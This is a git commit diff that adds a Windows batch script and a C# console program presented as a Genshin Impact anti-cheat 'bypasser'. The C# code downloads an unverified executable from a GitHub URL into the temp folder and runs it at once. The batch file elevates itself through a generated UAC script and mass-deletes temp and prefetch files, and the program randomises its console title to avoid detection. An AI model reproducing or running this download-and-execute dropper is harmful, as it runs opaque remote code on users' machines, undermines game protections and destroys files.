fe100f9fc548bd3a7445be974df55bf8dfbafbdb
Dwaine <76231245+DwaineDawn@users.noreply.github.com>
2021-10-16 04:20:35 +0800

    Updated Secure
    --changes code 
    --clean

---
+++ Clear_Temp.bat
@@ -0,0 +1,31 @@
+﻿@ECHO OFF
+
+rem run as administrator
+set "params=%*"
+cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
+
+del %TEMP%\*.* /f /s /q
+
+rem del /s /f /q %userprofile%\Recent\*.*
+
+del /s /f /q C:\Windows\Prefetch\*.*
+
+del /s /f /q C:\Windows\Temp\*.*
+
+del /s /f /q %USERPROFILE%\appdata\local\temp\*.*
+
+
+rem /Below command to Show the folder after deleted files
+
+rem xplorer %userprofile%\Recent
+
+rem Explorer C:\Windows\Prefetch
+
+rem Explorer C:\Windows\Temp
+
+rem Explorer %USERPROFILE%\appdata\local\temp
+
+timeout 1
+
+exit
+
---
+++ Program.cs
@@ -0,0 +1,153 @@
+﻿using System;
+using System.CodeDom.Compiler;
+using System.Data;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Threading;
+
+namespace GenshinPublic
+{
+    public class Program
+    {
+        static void Bypass()
+        {
+            bool Program = false;
+            try
+            {
+                //credit to DesirePro(FUCK#9803)
+                WebClient webClient = new WebClient();
+                webClient.DownloadFile(new Uri("https://github.com/DeftSolutions-dev/HackGenshin/raw/main/FuckYou/ggAC.exe"), Path.Combine(Path.GetTempPath(), "Bypass.exe"));
+                if (File.Exists(Path.Combine(Path.GetTempPath(), "Bypass.exe")) && new FileInfo(Path.Combine(Path.GetTempPath(), "Bypass.exe")).Length > 10L)
+                {
+                    Program = true;
+                }
+                else
+                {
+                    Console.WriteLine("Could Not Download File, check your Anti Virus!");
+                    Console.ReadKey();
+                }
+                if (Program)
+                {
+                    Process.Start(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
+                }
+            }
+            catch (WebException)
+            {
+                Console.WriteLine("Please Check Your Internet Connection");
+                Console.ReadKey();
+            }
+            catch (Exception arg)
+            {
+                Console.WriteLine("Error! " + arg);
+            }
+        }
+        private static void RandomName()
+        {
+            Console.Title = "";
+            Random rnd = new Random();
+            Char[] pwdChars = new Char[36] { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
+            for (int i = 35; i < 75; i++)
+                Console.Title += pwdChars[rnd.Next(0, 35)];
+            Thread.Sleep(10);
+        }
+        const string Chars = "awdauUWHU2Dw722322tyuawDawwGG3hwd";
+        static string RandomString(int length)
+        {
+            Random random = new Random();
+            return new string(Enumerable.Repeat(Chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+        [STAThread]
+        [DebuggerNonUserCode]
+        [GeneratedCode("PresentationBuildTasks", "1.0.0.0")]
+        public static void Main(string[] args)
+        {
+            RandomName();
+            if (Process.GetProcessesByName("GenshinImpact").Length != 0)
+            {
+                Bypass();
+                Console.WriteLine("Bypassing Genshin Anti Cheat...");
+                Console.WriteLine("Closing Mhyprot2... Wait....");
+                Console.Clear();
+                Console.WriteLine("Bypassed");
+                Console.WriteLine();
+                Console.WriteLine("credit to DesirePro(FUCK#9803)");
+                Console.WriteLine("Made By Dwaine#0572");
+                Console.ReadLine();
+                LoadFile();
+                return;
+            }
+
+            if (Process.GetProcessesByName("GenshinImpact").Length == 0)
+            {
+                int smollpp = 0;
+                while (smollpp < 5)
+                {
+                    RandomName();
+                    smollpp++;
+                }
+                using (Process process = Process.Start("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Genshin Impact\\Genshin Impact.lnk"))
+                {
+                    process.WaitForInputIdle();
+                    Console.WriteLine("PID Launcher.exe : " + process.Id);
+                    Process[] p = Process.GetProcessesByName("GenshinImpact");
+                    Console.WriteLine("PID Genshin Impact.exe : " + p);
+                }
+            }
+
+            RandomName();
+            Console.WriteLine("Cannot Bypass...");
+            Console.WriteLine("Open Genshin Impact");
+            Console.Beep();
+            Console.WriteLine("Load Into The Game Completely");
+            Console.WriteLine("Reopen This Bypasser");
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine("credit to DesirePro(FUCK#9803)");
+            Console.WriteLine("Made By Dwaine#0572");
+            Console.WriteLine();
+            Thread.Sleep(10000);
+            Console.Clear();
+            for (int i = 0; i < 15; i++)
+            {
+                string bigpp = "Closing The Program Now";
+                string smolp = "Reopen This Bypasser After You Completely Enterd World";
+                Console.WriteLine(bigpp + smolp);
+                Console.WriteLine("Loading...");
+            }
+            Thread.Sleep(2000);
+            Environment.Exit(0);
+            Console.ReadKey();
+        }
+
+        private static void LoadFile()
+        {
+            bool DelProg = false;
+            if (DelProg)
+            {
+                try
+                {
+                    File.Delete(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
+                    var tmpPath = Path.GetTempPath();
+                    var files = Directory.GetFiles(tmpPath, "*.*", SearchOption.AllDirectories);
+                    foreach (var file in files)
+                    {
+                        if (File.Exists(file))
+                        {
+                            File.Delete(file);
+                        }
+                    }
+                }
+                catch
+                {
+                    Process.Start("Clear_Temp.bat");
+                }
+            }
+        }
+        //credit to DesirePro(FUCK#9803)
+    }
+}
